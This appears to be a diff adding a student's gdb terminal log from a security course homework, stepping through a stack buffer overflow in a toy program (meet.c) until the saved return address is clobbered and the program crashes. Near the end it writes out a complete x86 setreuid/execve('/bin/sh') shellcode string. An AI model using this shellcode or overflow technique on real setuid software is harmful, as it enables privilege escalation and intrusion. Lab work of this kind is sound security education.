@@ -1,0 +1,138 @@
+jk2764@cs5435-hw4:~/cs5435-hw4/demo$ gdb -q target0
+Reading symbols from target0...
+(gdb) run perl -e 'print "A"x399'
+Starting program: /home/jk2764/cs5435-hw4/demo/target0 perl -e 'print "A"x399'
+Hi perl 
+Bye perl
+[Inferior 1 (process 1575973) exited normally]
+(gdb) run `perl -e 'print "A"x399'`
+Starting program: /home/jk2764/cs5435-hw4/demo/target0 `perl -e 'print "A"x399'`
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[Inferior 1 (process 1576159) exited normally]
+(gdb) run `perl -e 'print "A"x400'`
+Starting program: /home/jk2764/cs5435-hw4/demo/target0 `perl -e 'print "A"x400'`
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+
+Program received signal SIGSEGV, Segmentation fault.
+main (argc=1094795585, argv=0x41414141) at meet.c:17
+17              printf( "Bye %s\n", argv[1] );
+(gdb) b8
+Undefined command: "b8".  Try "help".
+(gdb) b 8
+Breakpoint 1 at 0x80491e3: file meet.c, line 8.
+(gdb) run `perl -e 'print "A"x400'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/jk2764/cs5435-hw4/demo/target0 `perl -e 'print "A"x400'`
+
+Breakpoint 1, greeting (temp1=0xffffd282 'A' <repeats 200 times>...) at meet.c:8
+8               memset(name, 0, 400);
+(gdb) info frame
+Stack level 0, frame at 0xffffd044:
+ eip = 0x80491e3 in greeting (meet.c:8); saved eip = 0x8049237
+ called by frame at 0xffffd050
+ source language c.
+ Arglist at 0xffffcea8, args: temp1=0xffffd282 'A' <repeats 200 times>...
+ Locals at 0xffffcea8, Previous frame's sp is 0xffffd044
+ Saved registers:
+  ebp at 0xffffd03c, eip at 0xffffd040
+(gdb) x/64x 0xffffd040
+0xffffd040:     0x08049237      0xffffd282      0x00000000      0xf7deded5
+0xffffd050:     0x00000002      0xffffd0e4      0xffffd0f0      0xffffd074
+0xffffd060:     0xf7fbc000      0x00000000      0xffffd0c8      0x00000000
+0xffffd070:     0xf7ffd000      0x00000000      0xf7fbc000      0xf7fbc000
+0xffffd080:     0x00000000      0x2d1d5a8a      0x6f00dc9a      0x00000000
+0xffffd090:     0x00000000      0x00000000      0x00000002      0x080490c0
+0xffffd0a0:     0x00000000      0xf7fe7ad4      0xf7fe22d0      0x0804c000
+0xffffd0b0:     0x00000002      0x080490c0      0x00000000      0x080490f6
+0xffffd0c0:     0x08049222      0x00000002      0xffffd0e4      0x08049260
+0xffffd0d0:     0x080492d0      0xf7fe22d0      0xffffd0dc      0x0000001c
+0xffffd0e0:     0x00000002      0xffffd25d      0xffffd282      0x00000000
+0xffffd0f0:     0xffffd413      0xffffd423      0xffffd437      0xffffd453
+0xffffd100:     0xffffd474      0xffffd483      0xffffd498      0xffffd4a7
+0xffffd110:     0xffffd514      0xffffd523      0xffffd52c      0xffffd53e
+0xffffd120:     0xffffd54b      0xffffdb2d      0xffffdb39      0xffffdbb4
+0xffffd130:     0xffffdbe5      0xffffdc04      0xffffdc26      0xffffdc3d
+(gdb) n
+9               strcpy(name, temp1);
+(gdb) x/64x 0xffffd040-32
+0xffffd020:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd030:     0x00000000      0x00000000      0x00000000      0xffffd048
+0xffffd040:     0x08049237      0xffffd282      0x00000000      0xf7deded5
+0xffffd050:     0x00000002      0xffffd0e4      0xffffd0f0      0xffffd074
+0xffffd060:     0xf7fbc000      0x00000000      0xffffd0c8      0x00000000
+0xffffd070:     0xf7ffd000      0x00000000      0xf7fbc000      0xf7fbc000
+0xffffd080:     0x00000000      0x2d1d5a8a      0x6f00dc9a      0x00000000
+0xffffd090:     0x00000000      0x00000000      0x00000002      0x080490c0
+0xffffd0a0:     0x00000000      0xf7fe7ad4      0xf7fe22d0      0x0804c000
+0xffffd0b0:     0x00000002      0x080490c0      0x00000000      0x080490f6
+0xffffd0c0:     0x08049222      0x00000002      0xffffd0e4      0x08049260
+0xffffd0d0:     0x080492d0      0xf7fe22d0      0xffffd0dc      0x0000001c
+0xffffd0e0:     0x00000002      0xffffd25d      0xffffd282      0x00000000
+0xffffd0f0:     0xffffd413      0xffffd423      0xffffd437      0xffffd453
+0xffffd100:     0xffffd474      0xffffd483      0xffffd498      0xffffd4a7
+0xffffd110:     0xffffd514      0xffffd523      0xffffd52c      0xffffd53e
+(gdb) n
+10              printf( "Hi %s \n", name );
+(gdb) x/64x 0xffffd040-32
+0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd030:     0x41414141      0x41414141      0x41414141      0xffffd000
+0xffffd040:     0x08049237      0xffffd282      0x00000000      0xf7deded5
+0xffffd050:     0x00000002      0xffffd0e4      0xffffd0f0      0xffffd074
+0xffffd060:     0xf7fbc000      0x00000000      0xffffd0c8      0x00000000
+0xffffd070:     0xf7ffd000      0x00000000      0xf7fbc000      0xf7fbc000
+0xffffd080:     0x00000000      0x2d1d5a8a      0x6f00dc9a      0x00000000
+0xffffd090:     0x00000000      0x00000000      0x00000002      0x080490c0
+0xffffd0a0:     0x00000000      0xf7fe7ad4      0xf7fe22d0      0x0804c000
+0xffffd0b0:     0x00000002      0x080490c0      0x00000000      0x080490f6
+0xffffd0c0:     0x08049222      0x00000002      0xffffd0e4      0x08049260
+0xffffd0d0:     0x080492d0      0xf7fe22d0      0xffffd0dc      0x0000001c
+0xffffd0e0:     0x00000002      0xffffd25d      0xffffd282      0x00000000
+0xffffd0f0:     0xffffd413      0xffffd423      0xffffd437      0xffffd453
+0xffffd100:     0xffffd474      0xffffd483      0xffffd498      0xffffd4a7
+0xffffd110:     0xffffd514      0xffffd523      0xffffd52c      0xffffd53e
+(gdb) n
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+11      }
+(gdb) n
+main (argc=1094795585, argv=0x41414141) at meet.c:17
+17              printf( "Bye %s\n", argv[1] );
+(gdb) n
+
+Program received signal SIGSEGV, Segmentation fault.
+main (argc=1094795585, argv=0x41414141) at meet.c:17
+17              printf( "Bye %s\n", argv[1] );
+(gdb) n
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) perl -e ' print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+' > sc
+Undefined command: "perl".  Try "help".
+(gdb) run perl -e ' print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/
+sh";' > sc
+Starting program: /home/jk2764/cs5435-hw4/demo/target0 perl -e ' print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";' > sc
+
+Breakpoint 1, greeting (temp1=0xffffd319 "perl") at meet.c:8
+8               memset(name, 0, 400);
+(gdb) n
+9               strcpy(name, temp1);
+(gdb) n
+10              printf( "Hi %s \n", name );
+(gdb) n
+11      }
+(gdb) n
+main (argc=4, argv=0xffffd184) at meet.c:17
+17              printf( "Bye %s\n", argv[1] );
+(gdb) n
+18      }
+(gdb) n
+0xf7deded5 in __libc_start_main () from /lib32/libc.so.6
+(gdb) n
+Single stepping until exit from function __libc_start_main,
+which has no line number information.
+[Inferior 1 (process 1579089) exited normally]
+(gdb) 
+[2]+  Stopped                 gdb -q target0
+jk2764@cs5435-hw4:~/cs5435-hw4/demo$ 
